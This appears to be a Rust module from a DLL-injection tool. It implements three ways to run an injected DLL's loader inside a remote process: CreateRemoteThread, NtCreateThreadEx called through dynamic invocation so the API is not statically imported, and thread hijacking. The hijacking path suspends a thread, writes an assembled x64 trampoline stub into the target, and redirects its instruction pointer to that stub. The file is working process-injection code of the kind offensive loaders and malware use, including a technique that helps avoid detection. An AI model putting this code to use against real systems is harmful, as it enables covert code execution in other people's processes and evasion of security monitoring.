use std::{ffi::c_void, ptr};

use dinvk::{data::NtCreateThreadEx, dinvoke};
use dynasmrt::{dynasm, DynasmApi};

use windows::core::w;
use windows::Win32::{
    Foundation::HANDLE,
    System::{
        LibraryLoader::GetModuleHandleW,
        Threading::{CreateRemoteThread, THREAD_ALL_ACCESS}
    }
};

use crate::remote_allocator::RemoteAllocator as _;
use crate::remote_process::RemoteProcess;

#[derive(Debug, Clone)] // todo: clone shouldnt be needed
pub enum ShellcodeExecution {
    CreateRemoteThread,
    NtCreateThreadEx,
    ThreadHijacking
}

pub struct Executor<'a> {
    remote_process: &'a RemoteProcess,
    inject_func_addr: usize,
    dll_path_mem_alloc: *mut c_void,
}

impl Executor<'_> {
    pub fn new(
        remote_process: &RemoteProcess,
        inject_func_addr: usize,
        dll_path_mem_alloc: *mut c_void
    ) -> Executor {
        Executor {
            remote_process,
            inject_func_addr,
            dll_path_mem_alloc,
        }
    }

    pub fn execute(&self, shellcode_execution_method: ShellcodeExecution) -> Result<HANDLE, Box<dyn std::error::Error>> {
        match shellcode_execution_method {
            ShellcodeExecution::CreateRemoteThread => self.execute_create_remote_thread(),
            ShellcodeExecution::NtCreateThreadEx => self.execute_nt_create_thread_ex(),
            ShellcodeExecution::ThreadHijacking => self.execute_thread_hijacking()
        }
    }

    fn execute_create_remote_thread(&self) -> Result<HANDLE, Box<dyn std::error::Error>> {
        let thread = unsafe {
            CreateRemoteThread(
                self.remote_process.handle(),
                None,
                0,
                Some(std::mem::transmute(self.inject_func_addr)),
                Some(self.dll_path_mem_alloc),
                0,
                None
            )
        }?;

        Ok(thread)
    }

    fn execute_nt_create_thread_ex(&self) -> Result<HANDLE, Box<dyn std::error::Error>> {
        let ntdll = unsafe { GetModuleHandleW(w!("ntdll.dll"))? };
        let mut thread: HANDLE = HANDLE::default();
        let pthread: *mut *mut c_void = &mut thread.0;

        let ntstatus: i32 = dinvoke!(
            ntdll.0,
            "NtCreateThreadEx",
            NtCreateThreadEx,
            pthread,
            THREAD_ALL_ACCESS.0,
            ptr::null_mut(),
            self.remote_process.handle().0,
            std::mem::transmute(self.inject_func_addr),
            self.dll_path_mem_alloc,
            0,
            0,
            0,
            0,
            ptr::null_mut()
        )
        .ok_or_else(|| "NtCreateThreadEx not found or resolved incorrectly")?;

        if ntstatus != 0 {
            return Err(format!("NtCreateThreadEx failed with NTSTATUS: {:#x}", ntstatus).into());
        }

        Ok(thread)
    }

    fn execute_thread_hijacking(&self) -> Result<HANDLE, Box<dyn std::error::Error>> {
        let mut remote_thread = self.remote_process.get_remote_thread()?;

        remote_thread.suspend()?;
        let mut context = remote_thread.get_context()?;

        let stub = create_trampoline_stub(
            self.dll_path_mem_alloc as u64,
            self.inject_func_addr as u64,
            context.get().Rip
        )?;

        let remote_shellcode = self.remote_process.alloc(stub.len(), true)?;
        self.remote_process.write(remote_shellcode, &stub)?;
        self.remote_process.flush_icache(remote_shellcode, stub.len())?;

        context.get_mut().Rip = remote_shellcode as u64;

        remote_thread.set_context(&context)?;

        remote_thread.resume()?;

        Ok(remote_thread.into_raw())
    }
}

fn create_trampoline_stub(
    dll_path_ptr: u64,
    inject_func_ptr: u64,
    original_rip: u64
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut ops = dynasmrt::x64::Assembler::new()?;

    dynasm!(ops
        ; .arch x64
        ; pushfq  // save flags

        ; push rax  // push registers
        ; push rcx
        ; push rdx
        ; push r8
        ; push r9
        ; push r10
        ; push r11

        ; sub rsp, 0x28  // shadow space + alignment

        ; mov rcx, QWORD dll_path_ptr as i64  // inject
        ; mov rax, QWORD inject_func_ptr as i64
        ; call rax

        ; add rsp, 0x28  // cleanup stack
        ; pop r11
        ; pop r10
        ; pop r9
        ; pop r8
        ; pop rdx
        ; pop rcx
        ; pop rax

        ; popfq  // restore flags

        ; mov rax, QWORD original_rip as i64 // jump back to original RIP
        ; jmp rax
    );

    let buf = ops.finalize().unwrap();
    println!("{:#04X?}, length: {}", buf.to_vec(), buf.to_vec().len());
    Ok(buf.to_vec())
}
